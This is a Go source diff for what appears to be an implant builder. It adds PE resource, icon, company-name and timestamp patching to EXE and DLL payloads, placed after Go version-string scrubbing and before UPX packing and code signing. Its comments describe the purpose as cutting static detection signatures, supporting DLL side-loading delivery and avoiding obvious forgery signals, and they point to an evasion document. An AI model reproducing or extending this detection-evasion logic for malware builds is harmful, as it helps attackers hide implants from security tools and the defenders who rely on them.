@@ -88,6 +88,35 @@ type BuildOptions struct {
 	// 白加黑场景宿主不一定调用我们的导出函数，所以默认加载即启动（见 dll.go）。
 	DLLExport    string `json:"dll_export"`
 	DLLAutoStart bool   `json:"dll_autostart"`
+
+	// ─── PE 版本资源 / 图标 / 公司信息 / 时间戳（v1.4.0 S3 第二批，静态降特征）───
+	//
+	// 命名口径（为什么这么叫）：与 DLLExport/DLLAutoStart 一致，用"资源语义 + 下划线"的
+	// JSON 名；统一加 `resource_` 前缀，是因为这一组字段**共同决定"要不要动 .rsrc"**，
+	// 日志/DB 记录/接口文档里一眼就能看出它们属于同一个动作（散装命名很容易漏配一个）。
+	//
+	// **硬要求：全部零值 = 什么都不注入** —— `PEResourceConfig.IsZero()` 为真时
+	// `PatchPEResources` 原样返回字节，默认构建与改动前逐字节一致、体积不变。
+	//
+	// ResourcePreset 一键套用一套**中性预设**（当前只认 "neutral"，见 ResourcePresetNeutral
+	// 与 GET /builders 的 resource_presets）：只填"操作员没显式给"的字段（显式字段永远优先），
+	// 内容是自有的 "ToShell Ops Toolkit" 标识，**不冒充任何真实厂商/系统组件**；
+	// 预设名不认识时构建报错（不静默按"没配资源"处理）。
+	ResourcePreset           string `json:"resource_preset"`
+	ResourceIconPath         string `json:"resource_icon_path"` // 服务端本地 .ico 路径（空 = 跟随 implant.icon_path）
+	ResourceCompanyName      string `json:"resource_company_name"`
+	ResourceProductName      string `json:"resource_product_name"`
+	ResourceFileDescription  string `json:"resource_file_description"`
+	ResourceFileVersion      string `json:"resource_file_version"` // a.b.c.d（空 = 1.0.0.0）
+	ResourceProductVersion   string `json:"resource_product_version"`
+	ResourceLegalCopyright   string `json:"resource_legal_copyright"`
+	ResourceOriginalFilename string `json:"resource_original_filename"`
+	ResourceInternalName     string `json:"resource_internal_name"`
+	// ResourceTimestampMode COFF 头时间戳策略：""/keep（不改）/ fixed / random。
+	// **不允许写出晚于构建机当前时间的时间戳**（未来时间戳是明显的伪造信号）。
+	ResourceTimestampMode string `json:"resource_timestamp_mode"`
+	// ResourceTimestamp fixed 策略的取值（RFC3339；空 = 内置基准 2024-03-15T09:00:00Z）。
+	ResourceTimestamp string `json:"resource_timestamp"`
 }
 
 type BuildResult struct {
@@ -339,6 +368,15 @@ func (b *Builder) Build(opts BuildOptions) (*BuildResult, error) {
 	}
 	if opts.StartDelayMin <= 0 {
 		opts.StartDelayMin = 2
+	}
+
+	// PE 资源注入的图标默认值（v1.4.0 S3 第二批）：请求里没给就用服务端配置
+	// implant.icon_path。必须在 logFinalizePipeline 之前收敛，否则"交付流水线"那行日志
+	// 会漏掉 pe_resource_patch 步骤（步骤是否出现取决于本次构建真的要打资源）。
+	if opts.ResourceIconPath == "" {
+		if cfg := config.Get(); cfg != nil {
+			opts.ResourceIconPath = cfg.Implant.IconPath
+		}
 	}
 
 	targetOS := opts.OS
@@ -606,6 +644,16 @@ func (b *Builder) compile(opts BuildOptions) ([]byte, error) {
 		logging.Info("builder", "go version string scrubbed: %s", strings.Join(removed, "；"))
 	}
 
+	// PE 版本资源 / 图标 / 公司信息 / 时间戳（v1.4.0 S3 第二批）：位置是**契约**——
+	// 必须在两道指纹擦除之后（擦除只做等长置零，先擦后写不会互相干扰）、UPX 与代码签名
+	// 之前（UPX 之后再补资源会把压缩结果改坏；签名之后再动一个字节就是"白签"）。
+	// 顺序契约见 finalize_order.go 的 StepResourcePatch，文档见 docs/EVASION.md §2.4。
+	if patched, err := b.patchResources(binary, &opts, targetOS); err != nil {
+		return nil, err
+	} else {
+		binary = patched
+	}
+
 	// UPX 压缩（仅 Windows exe 且 UPX 可用且开启）
 	if b.useUPX && opts.UPXEnable && targetOS == "windows" && (opts.Format == "exe" || opts.Format == "bin") {
 		compressed, err := b.compressWithUPX(binary)
@@ -674,6 +722,15 @@ func (b *Builder) compileLibrary(opts BuildOptions) ([]byte, error) {
 	if scrubbed, removed := ScrubGoVersionStrings(bin); len(removed) > 0 {
 		bin = scrubbed
 		logging.Info("builder", "DLL go version string scrubbed: %s", strings.Join(removed, "；"))
+	}
+	// PE 版本资源 / 图标 / 公司信息 / 时间戳（v1.4.0 S3 第二批）：与 exe 路径同一位置 ——
+	// 指纹擦除之后、签名之前（DLL 不走 UPX，所以这里没有 UPX 这一步）。
+	// DLL 是白加黑链交付的那个文件，资源信息对齐后"版本信息里写着公司名/产品名/图标"
+	// 不再只有宿主 EXE 才有。顺序契约见 finalize_order.go 的 StepResourcePatch。
+	if patched, err := b.patchResources(bin, &opts, targetOS); err != nil {
+		return nil, err
+	} else {
+		bin = patched
 	}
 	return bin, nil
 }
